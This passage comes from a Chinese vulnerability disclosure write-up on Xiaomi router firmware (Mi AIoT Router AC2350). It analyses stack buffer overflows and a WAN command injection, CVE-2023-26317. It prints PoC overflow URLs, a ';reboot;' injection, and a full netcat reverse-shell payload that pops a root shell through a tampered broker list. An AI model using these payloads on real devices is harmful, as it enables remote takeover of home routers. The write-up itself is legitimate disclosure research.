在这里我们可以看到上下文ctx至少存储了一个函数指针ctx->pk_info->ctx_free_func并将ctx->pk_ctx作为参数调用该函数。如果我们设法覆盖函数的堆栈帧或使用先前的调用来准备它，并且由于变量pk_contextinpublic_encrypt_kerybuf()没有在方法开始时初始化，则有可能pk_context在堆栈中构建一个假结构。  
  
  
例如，我们可以设置ctx->pk_info->ctx_free_func为libc system函数并设置ctx->pk_ctx为自定义字符串（例如：“/bin/sh”以生成 shell）。  
  
  
不幸的是，为这种攻击设置堆栈很复杂，因为我们可以在librsa.so运行时映射和取消映射的 Lua 代码中看到，只调用库中的一个函数 ( lua_rsa_pubkey_encrypt)，并没有真正给我们任何控制权：  
  
```
function getWifiPwdUrl()
    [...]
    -- Here, `lirsa.so` is loaded
    local lua_crypto = require("librsa")
 
    [...]
    local rsa_pub_key = LuciHttp.formvalue("rsa_pubkey")
    if rsa_pub_key == nil then
        result.code = 1
        result["msg"] = "http get rsa_pubkey null."
    end
        [...]
            local url = string.format('http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd?token=%s', lanip, token)
            XQLog.log(6,"iot url_origin:"..url)
 
            -- Here, only `lua_rsa_pubkey_encrypt` is called
            local url_new = lua_crypto.lua_rsa_pubkey_encrypt(url, rsa_pub_key)
 
            if url_new ~= nil then
                [...]
            else
                XQLog.log(6,"lua call C lib lua_rsa_pubkey_encrypt() ret nil")
                result.code = 3
                result["msg"] = "lua call c api ret null."
            end
    [...]
end
```  
  
  
**端点/api/misystem/get_wifi_pwd_url- 堆栈缓冲区溢出（已称为 CVE-2020-14124）**  
  
我们还可以通过给出长度超过 1024 字节的 RSA 公钥来触发堆栈缓冲区溢出lua_rsa_pubkey_encrypt()：接收 RSA 密钥的堆栈缓冲区位于堆栈上，长度为 1024 字节，但程序不会检查插入密钥的长度。  
  
```
int32_t lua_rsa_pubkey_encrypt(struct lua_State* lua_state) {
    char rsa_pub_key[1024];
    char url[256];
 
    memset(&rsa_pub_key, 0, 1024);
    memset(&url, 0, 256);
 
    [...]
 
    strcpy(&url, luaL_checklstring(lua_state, 1, 0));
    int32_t url_len = strlen(&url);
 
    // Stack buffer overflow !
    strcpy(&rsa_pub_key, luaL_checklstring(lua_state, 2, 0));
    int32_t key_len = strlen(&rsa_pub_key);
 
    [...]
}
```  
  
  
经过测试，我们可以控制PC1036字节之后的（程序计数器），因此这个bug最终可能会导致远程代码执行。  
  
  
为了PoC堆栈缓冲区溢出，我们需要发送超过1036个字符的RSA公钥。例如，我们可以输入 1036 * 'A'，然后PC用 'BBBB' 覆盖: http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAABBBB:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscPvibUlB8z6REKIZTyccK5yGCo7oJibCaHB5c7icJYNK4b9CRpCoVFcuAA/640?wx_fmt=png&from=appmsg "")  
  
不幸的是，利用此缓冲区溢出有一些限制：我们必须在有效负载中仅使用 base64 字符（A-Z, a-z, 0-9, +, =, /），使用 可以strcpy()防止空字节的存在，当然，我们必须再次处理与ASLR。然而，我们可以注意到，在这种情况下，我们可能会暴力破解 ASLR，因为librsa.so二进制文件是在运行时映射的，每次都在不同的位置，并且崩溃不会导致 DoS，因为它来自 lua 代码，每次都会重新执行。  
  
  
我们还注意到，该漏洞已被小米知晓，并于 2020 年由 Aobo Wang 在 上报告AX3600，编号为CVE-2020-14124。知道这一点后，我们决定不再花太多时间尝试利用它。  
  
  
**端点/api/misystem/get_wifi_pwd_url- memcmp()**  
  
由于两个先前错误的组合，我们可以触发memcmp()函数中发生的第三个错误。/lib/libuClibc-0.9.33.2.so通过发送包含至少一个非 Base64 字符的冗长且格式错误的 RSA 公钥（例如使用 8000 * 'A': http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAA%01BB），我们可能会导致崩溃：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscSianl8NWgDTldlsgTAg75keGicQgFFARCibGWqvydjNrqAZxfQ2d8HHbA/640?wx_fmt=png&from=appmsg "")  
  
然而，这个错误并没有真正的影响：进程崩溃，网页呈现 502 错误，但进程在下一个 API 请求中重新启动。此错误不可利用。  
  
  
**WAN**  
  
之前，我们研究了 LAN 接口，其中攻击者必须位于网络内部。我们的下一步是分析通过 WAN 接口进行外部攻击的可能性。  
  
  
在拦截 WAN 通信时，我们注意到路由器发出了不同的请求。其中一个请求似乎特别有趣：对https://eu.api.miwifi.com/miwifi-broker/list.我们手工重现它，看看答案是什么样的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscTh69Dv4JUibQIVxhmpaOHshtVWGLib8b0bno1KcJLibHP7yRViaR9FPHqQ/640?wx_fmt=png&from=appmsg "")  
  
**二进制/usr/bin/messagingagent- 命令注入 (CVE-2023-26317)**  
  
我们假设此 GET 请求用于检索MQTT服务器 IP，以便将来在路由器内进行通信。 IP 列表非常有趣，在看到一些二进制文件如何通过 直接将元素作为参数传递给其他二进制文件之后system()，我们直觉地认为这个 IP 列表可能会作为参数传递给某个二进制文件。因此我们可以尝试在这里盲目地注入命令。  
  
  
由于 HTTP 流量未加密且可以修改，我们拦截了请求并尝试注入;reboot;......serverList然后路由器重新启动！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscbYmFaictuEQwVdTmV7PzACcicrwOI9eO9tff720VbwuDc7p5EHb6Y39g/640?wx_fmt=png&from=appmsg "")  
  
对于 bash 注入，我们决定更进一步，演示可以使用netcat( nc 192.168.0.1 4343) 进行外部连接的注入。再次强调，该漏洞利用的唯一操作是拦截和修改传出的 HTTP 请求，这相对简单。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsc4pmjd5xxRYiapVMe5T7mLLxIiaPz2vRASnia2bpL2KfKA94JJFf4Foo6w/640?wx_fmt=png&from=appmsg "")  
  
此外，通过有效负载：serverList=192.168.2.5;rm -f /tmp/f;mknod /tmp/f p;echo 'cat /tmp/f|sh -i 2>&1|nc 192.168.0.1 4242 >/tmp/f' > revshell.sh;chmod 777 revshell.sh; sh revshell.sh;:1883，我们可以从 WAN 上的路由器上弹出 root shell：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsczzgBTPQwM2NcvjB3qRjv2peUNWhp7bsOEeiaZ3HotagZTQBuJUicEuGw/640?wx_fmt=png&from=appmsg "")  
  
现在，让我们看看这个错误是从哪里来的。  
  
  
二进制文件/usr/bin/messagingagent包含对 的请求https://eu.api.miwifi.com/miwifi-broker/list：URL 是使用文件构建config_api的/usr/share/messaging.conf。  
  
```
key_file = /usr/share/messaging/serverkey_2.pub
push_channel = xqpc
config_api = /miwifi-broker/list
register_device_api = /register_device
miwifi_service_ips = 183.84.5.44,58.83.177.108
```  
  
  
此请求返回以下形式的字符串：serverList=[IP]:[PORT],...。此 HTTP 响应的解析函数位于ma_app_context_update_conn_data处的函数中0x408698。在解析过程中，只需从响应中删除IP和PORT并将其连接到传递到函数中的字符串system。此方法的问题system在于命令可以轻松注入，因此参数注入IP会导致操作系统命令注入。  
  
```
int32_t ma_app_context_update_conn_data(void* arg1)
{
    [...]
    // Here we can see the split with ",": ["3.127.110.152:1884", "3.127.110.143:1883", "3.127.110.152:1883"]
    int32_t* configs_split = ma_str_split(*(int32_t*)((char*)arg1 + 0x18), ",");
    int32_t nb_configs = ma_str_array_size(configs_split);
    if (nb_configs == 0)
    {
        trap(0);
    }
 
     // Here a split with ":": ["3.127.110.152", "1884"]
    int32_t* ip_port_split = ma_str_split(configs_split[(v0_6 % nb_configs)], ":");
    if (ma_str_array_size(ip_port_split) != 2)
    {
        printf("[MQTT ERROR %d %s:%d]: Bad broker list: %s\n", time(0), "/ma_app_context.c", 0xae, *(int32_t*)((char*)arg1 + 0x18));
        fflush(stdout);
    }
    else
    {
        char* broker_ip = *(int32_t*)ip_port_split;
        int32_t broker_port = atoi(ip_port_split[1]);
        int32_t fd = fopen("/tmp/state/messagingagent", "w");
        void* a0_25;
        if (fd == 0)
        {
            printf("[MQTT ERROR %d %s:%d]: Unable to open /tmp/state/messagingagent\n", time(0), "/ma_app_context.c", 0x130);
            fflush(stdout);
            a0_25 = *(int32_t*)((char*)arg1 + 0x3c);
        }
        else
        {
            if (fprintf(fd, "%s:%d", broker_ip, broker_port) < 0)
            {
                printf("[MQTT ERROR %d %s:%d]: Unable to update /tmp/state/messagingagent\n", time(0), "/ma_app_context.c", 0x134);
                fflush(stdout);
            }
            fclose(fd);
 
            char command[0x30];
            // Command injection here using the IP field
            sprintf(&command,
                    "/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_HOST=%s",
                    broker_ip);
            system(&command);
            
            sprintf(&command,
                    "/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_PORT=%d",
                    broker_port);
            system(&command);
 
            system("/sbin/uci commit /etc/config/messaging");
    [...]
```  
  
  
**二进制/usr/bin/messagingagent- 堆栈缓冲区溢出 (CVE-2023-26320)**  
  
另外，我们注意到sprintf这里使用的方法，没有检查复制到堆栈缓冲区的IP字符串的长度，导致堆栈缓冲区溢出。用大字符串替换有效负载会导致缓冲区溢出。我们可以使用循环输入来 PoC 这个缓冲区溢出：  
  
```
serverList=192.168.2.5;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa:1883
```  
  
  
因此，这证明堆栈缓冲区溢出导致/usr/bin/messagingagent.该过程不会自行重新启动，路由器需要重新启动才能正常运行。更新、MQTT 连接和系统运行状况用作/usr/bin/messagingagent通信平台：所有这些系统都将因 DoS 而离线。崩溃如下图所示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscTDRNibibic8JBOW4BiaWrsz14kLNCrosQd5yGcrFE5AFfdEQEZj5v5P3nA/640?wx_fmt=png&from=appmsg "")  
  
问题：我们可以在这里看到我们确实发生了崩溃，但它看起来不像一个PC控件：它更像是任意指针取消引用。如果我们查看进程内存映射，我们可以得出结论，此错误发生在ma_str_array_clear()：  
  
```
void ma_str_array_clear(char** str_array) {
    char** _str_array = str_array;
    
    if (str_array == 0) {
        return;
    }
 
    while (true) {
        char* str = *(int32_t*)_str_array;
        if (str == 0) {
            break;
        }
 
        _str_array = &_str_array[1]; // _str_array++
        free(str);
    }
 
    return free(str_array);
}
```  
  
  
这个函数确实在我们的目标函数的末尾被调用ma_app_context_update_conn_data()：  
  
```
int32_t ma_app_context_update_conn_data(void* arg1) {
[...]
        ma_str_array_clear(configs_split);
        ma_str_array_clear(ip_port_split);
        ret = pthread_mutex_unlock(arg1);
    }
 
    return ret;
}
```  
  
  
我们这里遇到一个问题，因为堆栈的结构如下：  
  
```
[...]
char overflow_buffer[128];
char** configs_split;
```  
  
  
当溢出overflow_buffer时，我们覆盖了char**传递给ma_str_array_clear()函数的内容。随后，该函数尝试释放参数的内容并取消引用无法取消引用的内容，从而导致明显的崩溃。  
  
  
我们可以用一个小技巧来规避这个问题：char** overwritten_string_array_pointer用指向 的有效地址覆盖0x00000000。为此，我们可以从库中获取一个将映射到进程内存的地址。在函数结束时，ma_str_array_clear()将尝试释放它并看到指针已经指向 NULL，因此它将返回到ma_app_context_update_conn_data()。然后我们就可以执行返回指令并进行控制了PC。  
  
  
从下面的有效负载中可以看出，我们已更改BBBB为ws¢((for 0x7773a228)，它是运行时加载的库内的地址。这个简单的更改使我们能够产生直接影响，PC如下图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscjyChQCtCceFo0SDuoiaGZEFibNN9yS7WIwsefSqIp2gFicZQcBbgF9f2A/640?wx_fmt=png&from=appmsg "")  
  
事实上，我们注意到程序计数器PC已更改为循环有效负载中的字符串kaaa：我们在这里控制了PC97 个字节。  
  
  
然而，我们再次遇到了与二进制文件类似的问题smartcontroller，其中我们无法传递 NULL 字节，从而使使用 ROP（在messagingagent二进制文件中）的利用变得复杂，即使仍然可以像我们那样仅使用库地址0x7773a228。  
  
  
这里的主要问题是 ASLR 的存在，它不允许我们提前知道库的位置：例如，我们需要 ASLR 泄漏来利用这个错误（我们不能暴力破解 ASLR，因为我们知道如果进程崩溃，它不会自行重新启动）。至少，我们这里仍然存在 DoS。  
  
  
此外，由于我们已经在 WAN 上实现了 RCE，因此我们决定不再进一步利用此漏洞。  
  
  
**一些受影响的产品**  
  
本节包含一个表格，其中列出了一些容易受到所报告错误影响的小米固件。事实上，在第一次重复之后，我们意识到小米路由器对于不同的路由器固件具有通用的代码库，因此，单个漏洞可能会影响各种路由器。当然，我们只是通过在线下载的方式以编程方式检查固件，并没有购买路由器进行测试。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscHuTKpkGjXD9MYWKaoI4JQmmqBv6EXkhwiblEhK4vVTUNWlL0KCJ9Hkg/640?wx_fmt=png&from=appmsg "")  
  
注意：“缓解”缓冲区溢出意味着二进制文件是使用堆栈金丝雀保护进行编译的，这使得堆栈缓冲区溢出的利用变得更加困难。  
  
  
**结论**  
  
总之，本报告讨论了我们在 WAN 和 LAN 接口中发现的各种漏洞Mi AIoT Router AC2350，并验证了它们在其他小米固件中的存在。  
  
  
我们发现了早在 2020 年的漏洞，还发现了四个新的 CVE（CVE-2023-26317、CVE-2023-26318、CVE-2023-26319和CVE-2023-26320）。  
  
  
虽然我们希望我们的发现能够帮助小米加强其产品安全性，但值得注意的是，可能还有更多的错误需要发现！  
  
  
CVE-2023-26317：https://trust.mi.com/misrc/bulletins/advisory? cveId=529（WAN 命令注入）  
  
CVE-2023-26318：https://trust.mi.com/misrc/bulletins/advisory? cveId=539（LAN 认证后堆栈缓冲区溢出）  
  
CVE-2023-26319：https://trust.mi.com/misrc/bulletins/advisory? cveId=536（LAN 身份验证命令注入）  
  
CVE-2023-26320：https://trust.mi.com/misrc/bulletins/advisory? cveId=540（WAN 堆栈缓冲区溢出）  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
